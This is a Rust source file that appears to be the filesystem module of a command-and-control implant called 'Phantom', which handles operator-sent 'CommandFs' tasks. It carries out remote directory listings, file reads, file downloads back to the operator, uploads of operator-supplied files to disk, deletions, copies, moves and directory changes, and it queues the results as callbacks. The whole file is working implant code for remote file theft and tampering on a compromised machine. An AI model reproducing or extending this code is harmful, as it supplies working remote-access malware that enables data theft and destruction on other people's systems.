//! `CommandFs` (ID 10): filesystem operations.

use std::fs;

use red_cell_common::demon::{DemonCommand, DemonFilesystemCommand};

use crate::error::PhantomError;
use crate::parser::TaskParser;

use super::PhantomState;
use super::encode::*;
use super::types::{ActiveDownload, DownloadTransferState, PendingCallback};
use super::{io_error, normalize_path};

/// Handle `CommandFs` (ID 10): file system operations.
pub(super) async fn execute_filesystem(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let subcommand = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative filesystem subcommand"))?;
    let subcommand = DemonFilesystemCommand::try_from(subcommand)?;

    match subcommand {
        DemonFilesystemCommand::Dir => {
            let _file_explorer = parser.bool32()?;
            let target = normalize_path(&parser.wstring()?);
            let subdirs = parser.bool32()?;
            let files_only = parser.bool32()?;
            let dirs_only = parser.bool32()?;
            let list_only = parser.bool32()?;
            let _starts = parser.wstring()?;
            let _contains = parser.wstring()?;
            let _ends = parser.wstring()?;
            let payload =
                encode_fs_dir_listing(&target, subdirs, files_only, dirs_only, list_only)?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandFs),
                request_id,
                payload,
            });
        }
        DemonFilesystemCommand::Download => {
            let path = normalize_path(&parser.wstring()?);
            let file = fs::File::open(&path).map_err(|error| io_error(&path, error))?;
            let metadata = file.metadata().map_err(|error| io_error(&path, error))?;
            let total_size = metadata.len();
            let file_id: u32 = rand::random();
            let full_path =
                fs::canonicalize(&path).unwrap_or_else(|_| path.clone()).display().to_string();

            state.queue_callback(PendingCallback::FileOpen {
                request_id,
                file_id,
                file_size: total_size,
                file_path: full_path,
            });
            state.downloads.push(ActiveDownload {
                file_id,
                request_id,
                file,
                total_size,
                read_size: 0,
                state: DownloadTransferState::Running,
            });
        }
        DemonFilesystemCommand::Cat => {
            let path = normalize_path(&parser.wstring()?);
            let contents = fs::read(&path).map_err(|error| io_error(&path, error))?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandFs),
                request_id,
                payload: encode_fs_cat(&path, &contents)?,
            });
        }
        DemonFilesystemCommand::Upload => {
            let path = normalize_path(&parser.wstring()?);
            let mem_file_id = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative memfile id"))?;
            let Some(mem_file) = state.mem_files.get(&mem_file_id) else {
                state.queue_callback(PendingCallback::Error {
                    request_id,
                    text: format!("memfile {mem_file_id:#x} was not found"),
                });
                return Ok(());
            };
            if !mem_file.is_complete() {
                state.queue_callback(PendingCallback::Error {
                    request_id,
                    text: format!("memfile {mem_file_id:#x} is incomplete"),
                });
                return Ok(());
            }

            fs::write(&path, &mem_file.data).map_err(|error| io_error(&path, error))?;
            let file_size = u32::try_from(mem_file.data.len())
                .map_err(|_| PhantomError::InvalidResponse("uploaded file too large"))?;
            state.queue_callback(PendingCallback::FsUpload {
                request_id,
                file_size,
                path: path.display().to_string(),
            });
            state.mem_files.remove(&mem_file_id);
        }
        DemonFilesystemCommand::Cd => {
            let path = normalize_path(&parser.wstring()?);
            std::env::set_current_dir(&path).map_err(|error| io_error(&path, error))?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandFs),
                request_id,
                payload: encode_fs_path_only(DemonFilesystemCommand::Cd, &path)?,
            });
        }
        DemonFilesystemCommand::Remove => {
            let path = normalize_path(&parser.wstring()?);
            let is_dir = path.is_dir();
            if path.is_dir() {
                fs::remove_dir(&path).map_err(|error| io_error(&path, error))?;
            } else {
                fs::remove_file(&path).map_err(|error| io_error(&path, error))?;
            }
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandFs),
                request_id,
                payload: encode_fs_remove(&path, is_dir)?,
            });
        }
        DemonFilesystemCommand::Mkdir => {
            let path = normalize_path(&parser.wstring()?);
            fs::create_dir_all(&path).map_err(|error| io_error(&path, error))?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandFs),
                request_id,
                payload: encode_fs_path_only(DemonFilesystemCommand::Mkdir, &path)?,
            });
        }
        DemonFilesystemCommand::Copy => {
            let from = normalize_path(&parser.wstring()?);
            let to = normalize_path(&parser.wstring()?);
            fs::copy(&from, &to).map_err(|error| io_error(&from, error))?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandFs),
                request_id,
                payload: encode_fs_copy_move(DemonFilesystemCommand::Copy, true, &from, &to)?,
            });
        }
        DemonFilesystemCommand::Move => {
            let from = normalize_path(&parser.wstring()?);
            let to = normalize_path(&parser.wstring()?);
            fs::rename(&from, &to).map_err(|error| io_error(&from, error))?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandFs),
                request_id,
                payload: encode_fs_copy_move(DemonFilesystemCommand::Move, true, &from, &to)?,
            });
        }
        DemonFilesystemCommand::GetPwd => {
            let path = std::env::current_dir()
                .map_err(|error| PhantomError::Process(error.to_string()))?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandFs),
                request_id,
                payload: encode_fs_path_only(DemonFilesystemCommand::GetPwd, &path)?,
            });
        }
    }

    Ok(())
}
